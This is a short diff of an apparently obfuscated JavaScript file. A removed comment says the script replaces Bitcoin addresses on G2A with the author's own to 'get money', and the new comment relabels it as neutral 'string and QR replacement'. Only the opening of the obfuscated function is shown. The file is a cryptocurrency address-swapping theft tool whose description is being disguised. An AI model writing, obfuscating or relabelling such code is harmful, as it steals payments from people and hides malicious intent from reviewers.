@@ -1,5 +1,5 @@
 //Aaron McLean
-//JS replaces btc adress on g2a with mine, get money.
+//Obscufied Realtime String and QR Replacement
  
 (function(_0x4b529a, _0x3d4cc4) {
     var _0x5005d8 = function(_0x16373c) {
